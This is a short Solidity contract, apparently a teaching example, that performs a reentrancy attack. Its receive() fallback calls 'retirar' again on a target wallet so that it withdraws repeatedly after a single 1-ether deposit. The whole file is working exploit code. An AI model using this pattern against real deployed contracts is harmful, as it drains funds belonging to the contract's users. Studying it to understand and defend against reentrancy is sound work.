// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IWallet {
    function depositar() external payable;
    function retirar() external;
}

contract Ataque {
    IWallet public immutable wallet;

    constructor(IWallet _wallet) {
        wallet = _wallet;
    }

    function atacar() external payable {
        require(msg.value == 1 ether, "Insuficiente eth");
        wallet.depositar{value: 1 ether}();
        wallet.retirar();
    }
    
    receive() external payable {
        if (address(wallet).balance >= 1 ether)
            wallet.retirar();
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}